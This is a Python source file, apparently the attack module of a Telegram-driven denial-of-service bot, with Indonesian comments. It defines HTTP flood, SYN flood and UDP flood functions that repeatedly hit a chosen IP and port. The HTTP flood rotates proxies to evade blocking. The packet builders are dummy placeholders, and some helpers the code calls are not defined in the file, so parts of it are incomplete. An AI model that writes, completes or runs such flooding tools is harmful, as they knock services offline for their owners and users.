# attacks.py
import threading
import socket
import time
import random
import requests
from config import blocked_proxies, attack_status

# Fungsi untuk mengirimkan request HTTP Flood
def http_flood(ip, port, chat_id, proxy):
    attack_status[chat_id] = {'ip': ip, 'port': port, 'requests_sent': 0, 'running': True, 'http_status': 'Unknown'}
    while attack_status[chat_id]['running']:
        try:
            response = requests.get(f"http://{ip}:{port}", proxies={"http": proxy, "https": proxy}, timeout=5)
            attack_status[chat_id]['http_status'] = response.status_code
            attack_status[chat_id]['requests_sent'] += 1
        except Exception as e:
            attack_status[chat_id]['http_status'] = f"Error: {str(e)}"
            blocked_proxies.add(proxy)  # Tambahkan proxy yang terblokir ke daftar
            proxy = get_random_proxy(fetch_proxies())  # Dapatkan proxy baru yang masih berfungsi
            if proxy is None:
                bot.send_message(chat_id, "**Tidak ada proxy yang tersedia!**", parse_mode="Markdown")
                attack_status[chat_id]['running'] = False
                return
        time.sleep(0.1)  # Atur kecepatan request

# Fungsi untuk mengirimkan SYN Flood
def syn_flood(ip, port, chat_id):
    attack_status[chat_id] = {'ip': ip, 'port': port, 'packets_sent': 0, 'running': True, 'status': 'Unknown'}
    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
    while attack_status[chat_id]['running']:
        try:
            packet = create_syn_packet(ip, port)
            sock.sendto(packet, (ip, port))
            attack_status[chat_id]['packets_sent'] += 1
        except Exception as e:
            attack_status[chat_id]['status'] = f"Error: {str(e)}"
            attack_status[chat_id]['running'] = False
            return
        time.sleep(0.01)  # Atur kecepatan packet

# Fungsi untuk mengirimkan UDP Flood
def udp_flood(ip, port, chat_id):
    attack_status[chat_id] = {'ip': ip, 'port': port, 'packets_sent': 0, 'running': True, 'status': 'Unknown'}
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    while attack_status[chat_id]['running']:
        try:
            packet = create_udp_packet(ip, port)
            sock.sendto(packet, (ip, port))
            attack_status[chat_id]['packets_sent'] += 1
        except Exception as e:
            attack_status[chat_id]['status'] = f"Error: {str(e)}"
            attack_status[chat_id]['running'] = False
            return
        time.sleep(0.01)  # Atur kecepatan packet

# Fungsi untuk membuat paket SYN
def create_syn_packet(ip, port):
    # Implementasi pembuatan paket SYN (sederhana)
    packet = b'\x00' * 1024  # Paket dummy
    return packet

# Fungsi untuk membuat paket UDP
def create_udp_packet(ip, port):
    # Implementasi pembuatan paket UDP (sederhana)
    packet = b'\x00' * 1024  # Paket dummy
    return packet
